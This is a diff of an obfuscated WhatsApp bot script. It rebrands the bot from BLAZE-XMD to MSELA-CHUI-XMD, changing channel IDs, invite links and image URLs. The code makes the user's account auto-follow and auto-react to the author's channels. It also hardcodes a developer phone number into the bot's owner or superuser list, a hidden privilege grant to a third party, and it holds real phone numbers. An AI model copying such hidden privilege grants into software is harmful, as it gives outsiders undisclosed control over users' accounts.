@@ -83,7 +83,7 @@ async function maybeRegisterAutoContact(_0x3ebf38, _0x41595e, _0x50f5b5, _0x4eef
     if (!_0x41595e['endsWith']('@s.whatsapp.net') && !_0x41595e['endsWith']('@lid')) return;
     const _0x31abe6 = normalizePrivateContactJid(_0x50f5b5);
     if (!_0x31abe6 || !await shouldRegisterAutoContact(_0x31abe6)) return;
-    await registerAutoContact(_0x31abe6, "New Contact • BLAZE TECH");
+    await registerAutoContact(_0x31abe6, "New Contact • 𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃");
 }
 const {
     cacheLidPhone,
@@ -144,7 +144,7 @@ function decodeSessionId(_0x208c32) {
     const _0x25cb0c = null;
     let _0x4e28a1 = String(_0x208c32 || '')["trim"]();
     if (!_0x4e28a1 || _0x4e28a1['toLowerCase']() === 'zokk') return null;
-    _0x4e28a1 = _0x4e28a1['replace'](/^["']|["']$/g, '')['trim'](), _0x4e28a1 = _0x4e28a1["replace"](/^(?:BLAZE|BLAZE-TECH|BLAZE-XMD)~/i, ''), _0x4e28a1 = _0x4e28a1['replace'](/\s+/g, '')['replace'](/-/g, '+')["replace"](/_/g, '/');
+    _0x4e28a1 = _0x4e28a1['replace'](/^["']|["']$/g, '')['trim'](), _0x4e28a1 = _0x4e28a1["replace"](/^(?:BLAZE|𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃|𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃)~/i, ''), _0x4e28a1 = _0x4e28a1['replace'](/\s+/g, '')['replace'](/-/g, '+')["replace"](/_/g, '/');
     if (!/^[A-Za-z0-9+/]*={0,2}$/ ['test'](_0x4e28a1)) throw new Error('SESSION_ID\x20contains\x20invalid\x20characters;\x20use\x20the\x20complete\x20pairing-session\x20string');
     while (_0x4e28a1['length'] % 0x4) _0x4e28a1 += '=';
     return Buffer['from'](_0x4e28a1, 'base64')["toString"]("utf8");
@@ -190,8 +190,9 @@ function safeReconnect(_0x324442) {
         main();
     }, 0x7d0);
 }
-const CHANNEL_JID = '120363421014261315@newsletter',
-    GROUP_INVITE_LINK = 'https://chat.whatsapp.com/HxCDA2s89LMEZMyixnTSy5?s=cl&p=a&ilr=4',
+const CHANNEL_JID = '120363405040601085@newsletter',
+    CHANNEL_JIDS = ['120363405040601085@newsletter', '120363421014261315@newsletter'],
+    GROUP_INVITE_LINK = 'https://chat.whatsapp.com/DmSuN4ZMdnkAGdnpK0Q5Gl?s=cl&p=a&mlu=4&ilr=4',
     CHANNEL_EMOJIS = ['🔥', '❤️', '✊️'],
     STATUS_EMOJIS = ['❤️', '🩶', '🔥', '🤍', '♦️', '🎉', '💚', '💯', '✨', '☢️', '😍', '🎊'];
 let hasFollowedChannel = ![],
@@ -225,7 +226,7 @@ function shortenChannelUrl(_0x55ae26) {
 async function joinConfiguredDestinations(_0x37ee45) {
     const _0x52cf22 = null;
     if (!hasFollowedChannel) try {
-        hasFollowedChannel = !![], await _0x37ee45['newsletterFollow'](CHANNEL_JID), console['log']("✅ Auto-followed BLAZE Tech channel");
+        hasFollowedChannel = !![], await Promise.allSettled(CHANNEL_JIDS.map(jid => _0x37ee45['newsletterFollow'](jid))), console['log']("✅ Auto-followed configured channels");
     } catch (_0x3e14a5) {
         console['log']("Auto-follow channel failed or already followed: " + (_0x3e14a5['message'] || _0x3e14a5));
     }
@@ -414,7 +415,7 @@ async function main() {
                     }
                     continue;
                 }
-                if (_0x11f5b5 === CHANNEL_JID) try {
+                if (CHANNEL_JIDS.includes(_0x11f5b5)) try {
                     const _0x401b02 = _0x5e899c['key']?.['server_id'] || _0x5e899c['newsletterServerId'] || _0x5e899c['key']['id'];
                     if (!_0x401b02 || !_0x4f6f40?.["user"]?.['id']) continue;
                     const _0x32f458 = CHANNEL_EMOJIS[Math['floor'](Math['random']() * CHANNEL_EMOJIS['length'])],
@@ -685,7 +686,7 @@ async function main() {
         var _0x3311e4 = _0x2decc9 ? _0x4aeba8['key']['participant'] : '';
         const _0x3a9771 = _0x4aeba8['pushName'],
             _0x1d5bd7 = cachedSudoNumbers,
-            _0x52590b = '255627417402',
+            _0x52590b = '260774358600',
             _0x5eb3d7 = (getConf("NUMERO_OWNER") || conf['NUMERO_OWNER'] || '')['replace'](/[^0-9]/g, ''),
             _0x403e7b = [_0x474608, _0x52590b, _0x5eb3d7]["filter"](Boolean)["map"](_0x1a3eab => _0x1a3eab['replace'](/[^0-9]/g, '') + '@s.whatsapp.net'),
             _0x19789f = _0x403e7b['concat'](_0x1d5bd7),
@@ -699,7 +700,7 @@ async function main() {
                 'quoted': _0x4aeba8
             });
         }
-        console["log"]("\t🌍BLAZE-TECH ONLINE🌍"), console["log"]("=========== incoming message ===========");
+        console["log"]("\t🌍𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃 ONLINE🌍"), console["log"]("=========== incoming message ===========");
         _0x2decc9 && console['log']("message from group: " + _0x584d73);
         console["log"]('message\x20sent\x20by:\x20' + '[' + _0x3a9771 + '\x20:\x20' + _0x15bc47['split']("@s.whatsapp.net")[0x0] + '\x20]'), console["log"]('message\x20type:\x20' + _0x28711d), console['log']('------\x20message\x20content\x20------'), console["log"](_0xb210b1);
 
@@ -887,7 +888,7 @@ async function main() {
         }
         try {
             if (_0x4aeba8["message"][_0x28711d]["contextInfo"]['mentionedJid'] && (_0x4aeba8["message"][_0x28711d]['contextInfo']['mentionedJid']['includes'](_0xb17d2e) || _0x4aeba8['message'][_0x28711d]['contextInfo']["mentionedJid"]['includes'](conf['NUMERO_OWNER'] + "@s.whatsapp.net"))) {
-                if (_0x3ac8b2 == '120363421014261315@newsletter') return;;
+                if (_0x3ac8b2 == '120363405040601085@newsletter') return;;
                 if (_0x3b7703) {
                     console['log']('hummm');
                     return;
@@ -978,7 +979,7 @@ async function main() {
                                 console["log"]('antilink\x20remove\x20failed:\x20' + _0x1f24c6);
                             }
                             try {
-                                const _0x4d21af = 'https://raw.githubusercontent.com/blazetech-glitch/BLAZE-XMD/main/plugins/scs/menu1.jpg';
+                                const _0x4d21af = 'https://raw.githubusercontent.com/shadricksanga7-hub/MSELA-CHUI-TECHNOLOGIES/main/plugins/scs/leopard-menu-1.png';
                                 var _0x9acb2b = new Sticker(_0x4d21af, {
                                     'pack': 'Blaze-Tech',
                                     'author': conf['OWNER_NAME'],
@@ -1053,7 +1054,7 @@ async function main() {
                     'participant': _0x15bc47
                 };
                 var _0x25c684 = "bot detected, \n";
-                const _0x43f9b1 = 'https://raw.githubusercontent.com/blazetech-glitch/BLAZE-XMD/main/plugins/scs/menu1.jpg';
+                const _0x43f9b1 = 'https://raw.githubusercontent.com/shadricksanga7-hub/MSELA-CHUI-TECHNOLOGIES/main/plugins/scs/leopard-menu-1.png';
                 var _0x9acb2b = new Sticker(_0x43f9b1, {
                     'pack': 'Blaze-Tech',
                     'author': conf["OWNER_NAME"],
@@ -1238,7 +1239,7 @@ async function main() {
         if (_0x5f45b3 === 'connecting') console["log"]('\x20blaze\x20tech\x20is\x20connecting...');
         else {
             if (_0x5f45b3 === 'open') {
-                isReconnecting = ![], boundedAttempts = 0x0, await joinConfiguredDestinations(_0x4f6f40), console['log']("✅ blaze tech Connected to WhatsApp! ☺️"), console['log']('--'), await (0x0, baileys_1['delay'])(0xc8), console['log']('------'), await (0x0, baileys_1['delay'])(0x12c), console['log']('------------------/-----'), console['log']('blaze\x20tech\x20is\x20Online\x20🕸\x0a\x0a'), console['log']('Loading\x20blaze\x20tech\x20Commands\x20...\x0a');
+                isReconnecting = ![], boundedAttempts = 0x0, await joinConfiguredDestinations(_0x4f6f40), console['log']("✅ 𝐌selachui Connected to WhatsApp! ☺️"), console['log']('--'), await (0x0, baileys_1['delay'])(0xc8), console['log']('------'), await (0x0, baileys_1['delay'])(0x12c), console['log']('------------------/-----'), console['log']('blaze\x20tech\x20is\x20Online\x20🕸\x0a\x0a'), console['log']('Loading\x20blaze\x20tech\x20Commands\x20...\x0a');
                 const {
                     loadPlugins: _0x2f850a
                 } = require(__dirname + '/handlers/commandHandler');
@@ -1256,7 +1257,7 @@ async function main() {
                         'serverMessageId': 0x1
                     }
                 };
-                let _0xc1e295 = "╭─「 *𝗕𝗟𝗔𝗭𝗘 𝗫𝗠𝗗* 」\n│ ✅ *𝗢𝗡𝗟𝗜𝗡𝗘*\n├──────────────\n│ ⚙️ 𝗠𝗼𝗱𝗲: *" + _0x41aa42['toUpperCase']() + "*\n│ ⌨️ 𝗣𝗿𝗲𝗳𝗶𝘅: *" + prefixe + '*\x0a│\x20🌐\x20𝗪𝗲𝗯:\x20*blaze-xmd.zone.id*\x0a│\x20📣\x20𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹\x20𝗖𝗵𝗮𝗻𝗻𝗲𝗹\x0a╰──────────────';
+                let _0xc1e295 = "╭─「 *𝐌𝐒𝐄𝐋𝐀-𝐂𝐇𝐔𝐈-𝐗𝐌𝐃* 」\n│ ✅ *𝗢𝗡𝗟𝗜𝗡𝗘*\n├──────────────\n│ ⚙️ 𝗠𝗼𝗱𝗲: *" + _0x41aa42['toUpperCase']() + "*\n│ ⌨️ 𝗣𝗿𝗲𝗳𝗶𝘅: *" + prefixe + '*\x0a│\x20🌐\x20𝗪𝗲𝗯:\x20*github.com/shadricksanga7-hub/MSELA-CHUI-TECHNOLOGIES*\x0a│\x20📣\x20𝗢𝗳𝗳𝗶𝗰𝗶𝗮𝗹\x20𝗖𝗵𝗮𝗻𝗻𝗲𝗹\x0a╰──────────────';
                 const _0x34c72d = (getConf('NUMERO_OWNER') || conf["NUMERO_OWNER"] || '')['replace'](/[^0-9]/g, ''),
                     _0x14e99e = _0x34c72d ? _0x34c72d + "@s.whatsapp.net" : (_0x4f6f40['user']['id'] || '')['split'](':')[0x0]["split"]('@')[0x0] + "@s.whatsapp.net";
                 await _0x4f6f40['sendMessage'](_0x14e99e, {
